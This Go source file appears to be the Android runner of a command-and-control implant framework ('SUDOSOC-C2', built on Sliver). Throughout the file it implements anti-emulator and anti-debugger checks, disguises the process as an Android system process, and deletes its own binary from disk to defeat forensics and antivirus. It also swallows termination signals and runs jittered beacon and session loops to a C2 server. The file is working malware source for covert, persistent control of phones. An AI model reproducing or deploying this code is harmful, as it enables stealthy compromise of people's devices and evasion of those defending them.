//go:build android

package runner

/*
	SUDOSOC-C2 Framework — Android Phantom Runner (Hardened)
	Copyright (C) 2026  sudosoc — Seif

	Authorized penetration testing use only.

	Hardening layers applied here (on top of limits / evasion packages):
	  • Emulator detection via /system/build.prop + device nodes
	  • Anti-debugger via /proc/self/status TracerPid
	  • Process name masking (/proc/self/comm → benign-looking string)
	  • Signal hardening: SIGHUP/SIGPIPE ignored; SIGTERM/SIGINT swallowed
	  • Jitter on all reconnect/sleep timers (±40%)
	  • Keep-alive goroutine: prevents Android Doze from suspending the process
	  • Watchdog goroutine: restarts the connection loop if it exits unexpectedly
	  • Self-deletion from disk after startup (process lives in kernel page cache)
	  • Exponential backoff with cap on repeated connection failures
*/

import (
	"bufio"
	"math/rand"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/limits"
	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/transports"
)

// ═══════════════════════════════════════════════════════════════════════════
// Anti-analysis helpers
// ═══════════════════════════════════════════════════════════════════════════

// emulatorDetected returns true if we are running inside a QEMU / Genymotion
// / BlueStacks / AVD emulator based on /system/build.prop and device nodes.
func emulatorDetected() bool {
	// ── /system/build.prop ───────────────────────────────────────────────
	f, err := os.Open("/system/build.prop")
	if err == nil {
		defer f.Close()
		indicators := map[string][]string{
			"ro.kernel.qemu":          {"1"},
			"ro.hardware":             {"goldfish", "ranchu", "vbox86"},
			"ro.product.manufacturer": {"genymotion"},
			"ro.product.model": {
				"android sdk built for", "sdk_gphone",
				"emulator", "google_sdk", "android sdk",
			},
			"ro.product.name":   {"sdk_gphone", "vbox86p", "generic_x86"},
			"ro.product.device": {"vbox86p", "emulator64"},
		}
		sc := bufio.NewScanner(f)
		for sc.Scan() {
			line := sc.Text()
			if len(line) == 0 || line[0] == '#' {
				continue
			}
			idx := strings.IndexByte(line, '=')
			if idx < 1 {
				continue
			}
			key := strings.TrimSpace(line[:idx])
			val := strings.ToLower(strings.TrimSpace(line[idx+1:]))
			if pats, ok := indicators[key]; ok {
				for _, p := range pats {
					if strings.Contains(val, p) {
						return true
					}
				}
			}
		}
	}

	// ── Emulator-specific device nodes ───────────────────────────────────
	emulatorNodes := []string{
		"/dev/socket/qemud",
		"/dev/qemu_pipe",
		"/system/bin/qemu-props",
		"/sys/qemu_trace",
		"/system/lib/libc_malloc_debug_qemu.so",
		"/system/bin/androVM-prop",
		"/system/bin/vboxservice",
	}
	for _, p := range emulatorNodes {
		if _, err := os.Stat(p); err == nil {
			return true
		}
	}
	return false
}

// debuggerAttached reads TracerPid from /proc/self/status.
func debuggerAttached() bool {
	f, err := os.Open("/proc/self/status")
	if err != nil {
		return false
	}
	defer f.Close()
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		line := sc.Text()
		if !strings.HasPrefix(line, "TracerPid:") {
			continue
		}
		fields := strings.Fields(line)
		return len(fields) >= 2 && fields[1] != "0"
	}
	return false
}

// ═══════════════════════════════════════════════════════════════════════════
// Stealth helpers
// ═══════════════════════════════════════════════════════════════════════════

// maskProcess writes a benign-looking name to /proc/self/comm.
// This changes what appears in `ps` output (kernel truncates to 15 chars).
// Looks like a system process to casual inspection.
func maskProcess() {
	// Masquerade as Android system process
	_ = os.WriteFile("/proc/self/comm", []byte("android.hardwar"), 0)
}

// deleteSelf removes our binary from the filesystem.
// The process continues running because the Linux kernel keeps the
// ELF loaded in memory (anonymous pages) until all references close.
// Makes forensic recovery harder and avoids AV rescanning the file.
func deleteSelf() {
	exe, err := os.Executable()
	if err != nil {
		return
	}
	// Only delete paths that look like our deployment location
	if strings.Contains(exe, "/data/local") ||
		strings.Contains(exe, "/sdcard") ||
		strings.Contains(exe, "com.termux") ||
		strings.Contains(exe, "phantom") {
		_ = os.Remove(exe)
	}
}

// ═══════════════════════════════════════════════════════════════════════════
// Timing / resilience helpers
// ═══════════════════════════════════════════════════════════════════════════

// jitter returns d varied by ± pct percent using a local RNG.
// Prevents C2 beacon timing from being fingerprinted by network sensors.
func jitter(rng *rand.Rand, d time.Duration, pct int) time.Duration {
	if pct <= 0 || d <= 0 {
		return d
	}
	spread := int64(d) * int64(pct) / 100
	if spread == 0 {
		return d
	}
	delta := rng.Int63n(spread*2) - spread
	result := d + time.Duration(delta)
	if result < time.Second {
		result = time.Second
	}
	return result
}

// keepAlive prevents Android Doze mode from suspending our goroutines by
// performing a cheap periodic syscall (read 1 byte from /dev/urandom).
// Must be started as a goroutine.
func keepAlive() {
	ticker := time.NewTicker(25 * time.Second)
	defer ticker.Stop()
	buf := make([]byte, 1)
	for range ticker.C {
		if f, err := os.Open("/dev/urandom"); err == nil {
			_, _ = f.Read(buf)
			f.Close()
		}
	}
}

// ═══════════════════════════════════════════════════════════════════════════
// Entry point
// ═══════════════════════════════════════════════════════════════════════════

// Main is the Android implant entry point.
// Called by the generated main() after init().
func Main() {
	// {{if .Config.Debug}}
	log.SetFlags(log.LstdFlags | log.Lshortfile)
	log.Printf("[phantom-android] starting — hardened build")
	// {{end}}

	// ── 1. Anti-emulator — exit before any network activity ──────────────
	if emulatorDetected() {
		// {{if .Config.Debug}}
		log.Printf("[phantom-android] emulator detected — exit")
		// {{end}}
		os.Exit(0)
	}

	// ── 2. Anti-debugger ─────────────────────────────────────────────────
	if debuggerAttached() {
		// {{if .Config.Debug}}
		log.Printf("[phantom-android] debugger detected — exit")
		// {{end}}
		// Small sleep makes timing analysis harder before we exit
		time.Sleep(3 * time.Second)
		os.Exit(0)
	}

	// ── 3. Platform limits (hostname / datetime / locale / sandbox) ───────
	limits.ExecLimits()

	// ── 4. Stealth ────────────────────────────────────────────────────────
	maskProcess()
	go keepAlive()

	// Delete binary from disk after a short delay so the Go runtime
	// fully maps itself before the file is unlinked.
	go func() {
		time.Sleep(3 * time.Second)
		deleteSelf()
	}()

	// ── 5. Signal hardening ───────────────────────────────────────────────
	// SIGHUP and SIGPIPE are ignored outright (common kill vectors for
	// background processes on Android).
	signal.Ignore(syscall.SIGHUP, syscall.SIGPIPE)

	// SIGTERM / SIGINT are "swallowed" — we log (debug) and continue.
	// Only kill -9 (SIGKILL) can forcibly terminate us.
	sigCh := make(chan os.Signal, 2)
	signal.Notify(sigCh, syscall.SIGTERM, syscall.SIGINT)
	go func() {
		for range sigCh {
			// {{if .Config.Debug}}
			log.Printf("[phantom-android] signal received — ignoring")
			// {{end}}
			// Re-register to catch the next one
			signal.Notify(sigCh, syscall.SIGTERM, syscall.SIGINT)
		}
	}()

	// ── 6. Initial startup jitter ─────────────────────────────────────────
	// Randomise first-call timing to prevent beacon-interval fingerprinting
	// and to spread load when many implants start simultaneously.
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	startDelay := jitter(rng, transports.GetReconnectInterval()/3, 40)
	// {{if .Config.Debug}}
	log.Printf("[phantom-android] startup jitter: %s", startDelay)
	// {{end}}
	time.Sleep(startDelay)

	// ── 7. Main C2 loop ───────────────────────────────────────────────────
	// {{if .Config.IsBeacon}}
	androidBeaconStartup(rng)
	// {{else}}
	androidSessionStartup(rng)
	// {{end}}
}

// ═══════════════════════════════════════════════════════════════════════════
// Session mode
// ═══════════════════════════════════════════════════════════════════════════

// androidSessionStartup runs the interactive-session connection loop with
// exponential backoff, jitter, and a watchdog that prevents silent death.
func androidSessionStartup(rng *rand.Rand) {
	// {{if .Config.Debug}}
	log.Printf("[phantom-android] session mode starting")
	// {{end}}

	// Watchdog: if the inner loop returns unexpectedly we restart it.
	for {
		runSessionLoop(rng)

		// Inner loop returned — wait with backoff then restart the whole thing
		backoff := jitter(rng, transports.GetReconnectInterval(), 50)
		// {{if .Config.Debug}}
		log.Printf("[phantom-android] session loop exited — restarting in %s", backoff)
		// {{end}}
		time.Sleep(backoff)

		// Re-check for debugger after a long sleep gap
		if debuggerAttached() {
			os.Exit(0)
		}
	}
}

// runSessionLoop wraps the transport session loop with per-connection jitter.
func runSessionLoop(rng *rand.Rand) {
	abort := make(chan struct{})
	defer func() {
		recover() // catch any unexpected panic in transport layer
	}()

	connections := transports.StartConnectionLoop(abort)
	errs := 0
	maxErr := transports.GetMaxConnectionErrors()

	for connection := range connections {
		if connection != nil {
			err := sessionMainLoop(connection)
			if err != nil {
				if err == ErrTerminate {
					connection.Cleanup()
					abort <- struct{}{}
					return
				}
				errs++
				// {{if .Config.Debug}}
				log.Printf("[phantom-android] session error %d/%d: %v", errs, maxErr, err)
				// {{end}}
				if maxErr < errs {
					abort <- struct{}{}
					return
				}
			} else {
				errs = 0 // reset on successful iteration
			}
		}
		// Jittered sleep between reconnect attempts
		reconnect := jitter(rng, transports.GetReconnectInterval(), 40)
		// {{if .Config.Debug}}
		log.Printf("[phantom-android] reconnect in %s", reconnect)
		// {{end}}
		time.Sleep(reconnect)
	}
}

// ═══════════════════════════════════════════════════════════════════════════
// Beacon mode
// ═══════════════════════════════════════════════════════════════════════════

// {{if .Config.IsBeacon}}

// androidBeaconStartup runs the beacon loop with the same hardening as
// the session path.
func androidBeaconStartup(rng *rand.Rand) {
	// {{if .Config.Debug}}
	log.Printf("[phantom-android] beacon mode starting")
	// {{end}}

	for {
		runBeaconLoop(rng)

		backoff := jitter(rng, transports.GetReconnectInterval(), 50)
		// {{if .Config.Debug}}
		log.Printf("[phantom-android] beacon loop exited — restarting in %s", backoff)
		// {{end}}
		time.Sleep(backoff)

		if debuggerAttached() {
			os.Exit(0)
		}
	}
}

// runBeaconLoop wraps the transport beacon loop with jitter.
func runBeaconLoop(rng *rand.Rand) {
	abort := make(chan struct{})
	defer func() {
		recover()
	}()

	beacons := transports.StartBeaconLoop(abort)
	errs := 0
	maxErr := transports.GetMaxConnectionErrors()

	for beacon := range beacons {
		// {{if .Config.Debug}}
		log.Printf("[phantom-android] beacon tick: %v", beacon)
		// {{end}}
		if beacon != nil {
			if c2 := transports.GetC2URI(); c2 != "" && c2 != beacon.ActiveC2 {
				continue
			}
			err := beaconMainLoop(beacon)
			if err != nil {
				errs++
				// {{if .Config.Debug}}
				log.Printf("[phantom-android] beacon error %d/%d: %v", errs, maxErr, err)
				// {{end}}
				if maxErr < errs {
					abort <- struct{}{}
					return
				}
			} else {
				errs = 0
			}
		}

		if c2 := transports.GetC2URI(); c2 != "" && (beacon == nil || c2 != beacon.ActiveC2) {
			continue
		}
		// Jittered beacon interval
		interval := jitter(rng, transports.GetReconnectInterval(), 40)
		// {{if .Config.Debug}}
		log.Printf("[phantom-android] next beacon in %s", interval)
		// {{end}}
		time.Sleep(interval)
	}
}

// {{end}}
